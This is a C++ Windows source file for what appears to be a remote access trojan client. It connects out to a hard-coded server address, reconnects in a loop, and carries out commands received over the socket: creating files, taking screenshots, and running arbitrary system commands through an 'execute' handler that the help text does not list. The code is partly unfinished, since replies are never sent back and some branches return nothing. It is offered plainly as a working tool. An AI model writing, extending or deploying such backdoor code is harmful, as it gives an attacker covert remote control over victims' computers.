#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include "customtools.h"

WSADATA Winsockdata;
int     iWsaStartup;
int     iWsaCleanup;

SOCKET  TCPClientSocket;
int     iTCPClientStart;
int     iCloseSocket;

struct  sockaddr_in TCPServerAdd;

int     iConnect;

int     iRecv;
bool    ErrorInSendMessage = false;

char    ipAddr[32] = "127.0.0.1";
int     port = 8000;

bool    Connected = false;


// Functions
void TCPClientStart();
void Connect();
void SendMsg(std::string msg);
void CloseSocket();
void UDF_WSACleanup();


std::string ReceiveMsg();
std::string CommandsHandler(std::string);
std::string split(std::string, int, int);

int main() {
	while (true) {

		TCPClientStart();

		if (iTCPClientStart == 0) {

			while (true) {

				if (iTCPClientStart == 0) {

					Connect();

					if (iConnect != INVALID_SOCKET) {

						Connected = true;

						while (Connected) {

							std::string message = ReceiveMsg();

							if (iRecv != SOCKET_ERROR) {

								CommandsHandler(message);

							}
							else Connected = false;
						}
					}
				}

				CloseSocket();
				UDF_WSACleanup();

				Sleep(5000);
				TCPClientStart();
			}
		}
		Sleep(5000);
	}
	return 0;
}


void TCPClientStart() {
	// WSAStartup
	iWsaStartup = WSAStartup(MAKEWORD(2, 2), &Winsockdata);
	if (iWsaStartup != 0) {
		std::cout << "WSAStartUp Failed!" << std::endl;
	}
	else {
		std::cout << "WSAStartUp Success!" << std::endl;

		// Filling Structure
		TCPServerAdd.sin_family = AF_INET;
		TCPServerAdd.sin_addr.s_addr = inet_addr(ipAddr);
		TCPServerAdd.sin_port = htons(port);

		// Socket Creation
		TCPClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (TCPClientSocket == INVALID_SOCKET) {
			std::cout << "TCP Client Socket Creation Failed!" << WSAGetLastError() << std::endl;
		}
		else {
			std::cout << "TCP Client Socket Creation Success!" << std::endl;
			iTCPClientStart = 0;
		}
	}
}

void Connect() {
	iConnect = connect(TCPClientSocket, (SOCKADDR*)&TCPServerAdd, sizeof(TCPServerAdd));
	if (iConnect == INVALID_SOCKET) std::cout << "Connection Failed! Error no: " << WSAGetLastError() << std::endl;
	else std::cout << "Connected to Server!" << std::endl;
}

void SendMsg(std::string msg) {
	char SenderBuffer;

	// Appending "EOT" char to message
	msg += (char)3;
	msg += (char)3;
	msg += (char)3;

	// Sending the message to client
	for (int i = 0; i < msg.size(); i++) {
		SenderBuffer = msg.at(i);
		if (send(TCPClientSocket, &SenderBuffer, sizeof(SenderBuffer), 0) == SOCKET_ERROR) {
			ErrorInSendMessage = true;
			break;
		}
	}

	// Checking if message was sent successfully
	if (ErrorInSendMessage) {
		std::cout << "An error occurred while sending message to client! Error no: " << WSAGetLastError() << std::endl;
	}
	else {
		std::cout << "Message was sent successfuly!" << std::endl;
	}
}

std::string ReceiveMsg() {
	char    RecvBuffer;
	int     iRecvBuffer = sizeof(RecvBuffer);
	int     checks = 0;

	std::string msg;
	std::string tmp;

	std::cout << "Receiving Message: ";
	while (true) {
		iRecv = recv(TCPClientSocket, &RecvBuffer, iRecvBuffer, 0);
		if (iRecv == SOCKET_ERROR) {
			std::cout << std::endl << "Receive Data Failed! Error no: " << WSAGetLastError() << std::endl;
			break;
		}
		else {
			if ((RecvBuffer == (char)3) && checks == 0) {
				checks = 1;
				tmp += RecvBuffer;
			}
			else if ((RecvBuffer == (char)3) && checks == 1) {
				checks = 2;
				tmp += RecvBuffer;
			}
			else if ((RecvBuffer == (char)3) && checks == 2) {
				checks = 3;
				break;
			}
			else {
				checks = 0;
				msg.append(tmp);
				msg += RecvBuffer;
				tmp = "";
			}
		}
	}
	return msg;
}

void CloseSocket() {
	iCloseSocket = closesocket(TCPClientSocket);
	if (iCloseSocket == SOCKET_ERROR) std::cout << "Closing Socket Failed! Error no: " << WSAGetLastError() << std::endl;
	else std::cout << "Closing Socket Success!" << std::endl;
}

void UDF_WSACleanup() {
	iWsaCleanup = WSACleanup();
	if (iWsaCleanup == SOCKET_ERROR) std::cout << "Cleanup Func Failed! Error no: " << WSAGetLastError() << std::endl;
	else std::cout << "WSACleanup Func Success!" << std::endl;
}

std::string CommandsHandler(std::string msg) {

	if (msg.find("help") == 0) {
		std::string help = "Help Commands:\n\t";
		help.append("help\n\t");
		help.append("create [FileName] in [Directory]\n\t");
		help.append("screenshot [FileName] in [Directory]\n\t");

		return help;
	}
	else if (msg.find("create") == 0) {
		//std::cout << "create [FileName] in [Directory]" << std::endl;
		if (msg.find(" ") == 6) {
			int splitPoint = msg.find(" in ");
			if (splitPoint == std::string::npos) return "Invalid Syntax";
			std::string fileName = split(msg, 7, splitPoint);
			//std::cout << "File Name: >" << fileName << "<" << std::endl; // debuging line
			splitPoint += 4;
			if (splitPoint >= msg.length()) return "Invalid Syntax";
			std::string loc = split(msg, splitPoint, msg.length());
			std::string path = loc;
			path.append(fileName);
			std::ofstream file(path);
			if (file.is_open()) {
				file.close();
			}
			else {
				return "File filed to create";
			}
			//std::cout << "Location: >" << loc << "<" << std::endl; // debuging line
		}
		else {
			return "Invalid Syntax of create cmd";
		}
	}
	else if (msg.find("screenshot") == 0) {
		if (msg.find(" ") == 10) {
			int splitPoint = msg.find(" in ");
			if (splitPoint == std::string::npos) return "Invalid Syntax";
			std::string fileName = split(msg, 11, splitPoint);
			splitPoint += 4;
			if (splitPoint >= msg.length()) return "Invalid Syntax";
			std::string loc = split(msg, splitPoint, msg.length());
			std::string path = loc;
			path.append(fileName);
			TakeScreenShot(path);
		}
		else {
			return "Invalid Syntax of create cmd";
		}
	}
	else if (msg.find("execute") == 0) {
		if (msg.find(" ") == 7) {
			std::string cmd = split(msg, 8, msg.length());
			exec(cmd);
		}
	}



	else {
		return "Invalid Syntax";
	}
}

std::string split(std::string str, int from, int to) {
	std::string subStr;
	for (int i = from; i < to; i++) {
		subStr += str.at(i);
	}
	return subStr;
}